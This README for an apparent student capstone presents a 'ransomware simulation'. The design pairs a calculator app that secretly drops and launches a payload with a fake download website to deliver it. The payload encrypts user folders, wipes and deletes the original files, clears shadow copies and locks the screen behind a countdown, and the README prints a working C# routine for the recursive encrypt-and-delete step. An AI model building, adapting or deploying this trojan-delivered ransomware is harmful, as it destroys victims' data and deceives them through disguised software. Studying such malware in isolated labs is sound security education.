


```markdown
# Capstone Project: Ransomware Simulation & Delivery  
**Aimery Barrault | CSCI 460 – Capstone**

---

## 🚀 Project Overview

This repository contains a ransomware simulation for controlled, educational use:

- **CalculatorApp.exe** – a benign “calculator” UI that drops and launches the real payload  
- **capstone-site/** – Next.js “fake download” website to deliver the payload  
- **payload.txt** & **base64script.py** – utilities to embed and extract the encrypted dropper  

 **Do not deploy on production systems or without explicit authorization.**

---

## ⚙️ Setting Up the Fake-Download Site

1. **Enter the site directory**  
   ```bash
   cd capstone-site
````

2. **Install dependencies**

   ```bash
   npm install
   # or
   yarn install
   ```

3. **Place your payload**
   Copy `CalculatorApp.exe` into:

   ```
   capstone-site/public/Downloads
   ```

4. **Run in development**

   ```bash
   npm run dev
   # or
   yarn dev
   ```

   Open [http://localhost:3000](http://localhost:3000).


---

## 🖥️ CalculatorApp (Dropper UI)

**MainWindow\_CalculatorApp.cs** – WPF application that:

* Displays a standard calculator UI.
* On a trigger (e.g. backspace), reads Base64 string, decodes the real dropper, writes it to `%USERPROFILE%\Documents\CalculatorManager.exe`, launches it, and exits.


---

## 🔒 Ransomware Simulator

**MainWindow\_Manager.cs** – WPF application that:

1. **EncryptAll()** – Recursively encrypts user files under:

   * Desktop
   * Documents
   * Pictures
   * Downloads
   * Public Documents
2. **AES-128 CBC** with a fresh IV per file (prepended to ciphertext)
3. **SecureDelete()** – Overwrites original with zeroes, then deletes
4. **Countdown Timer** – 24-hour full-screen, top-most UI lockdown
5. **Password-protected Decrypt** – PBKDF2(SHA-256) verification, max 3 attempts
6. **SelfDestruct()** – Clears shadow copies, zero-wipes key & flag, removes Run-key, then exits

<details>
<summary>Encryption code excerpt</summary>

```csharp
private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
{
    // encrypt files in this folder
    string[] files;
    try { files = Directory.GetFiles(dir); }
    catch { return; } // skip unreadable folder

    foreach (var f in files)
    {
        if (f.EndsWith(".aes") || f.Equals(self)) continue;
        try
        {
            using var fin  = new FileStream(f, FileMode.Open, FileAccess.Read);
            using var fout = new FileStream(f + ".aes", FileMode.Create, FileAccess.Write);
            using var aes  = Aes.Create();
            aes.Key     = aesKey;
            aes.GenerateIV();
            aes.Mode    = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            // write IV prefix
            fout.Write(aes.IV, 0, aes.IV.Length);
            using var cs = new CryptoStream(fout, aes.CreateEncryptor(), CryptoStreamMode.Write);
            fin.CopyTo(cs);
        }
        catch (Exception ex)
        {
            File.AppendAllText("error.log", $"ENCRYPT {f} → {ex.Message}\n");
        }
        // securely overwrite & delete original
        SecureDelete(f);
    }

    // recurse into subdirectories
    string[] subs;
    try { subs = Directory.GetDirectories(dir); }
    catch { return; }
    foreach (var sub in subs)
        SafeEncryptDirectory(sub, aesKey, self);
}
```

</details>


---

## ✅ Windows Setup & Execution

1. Copy executables & scripts to a Windows 10 VM.
2. Run `CalculatorApp.exe` to drop & launch `CalculatorManager.exe`.
3. Observe `*.aes` files in Desktop/Documents/etc.
4. Enter the correct password to decrypt.

---

## ⚖️ Legal Disclaimer

This software is provided **as-is** for **educational purposes only**. Misuse without explicit authorization is prohibited. By using this software you agree that:

1. You are solely responsible for any damage.
2. The author and institution assume no liability.
3. Run only in isolated, authorized test environments.

---

## 📜 License

MIT License. See [LICENSE.md](LICENSE.md) for full terms.

```
```
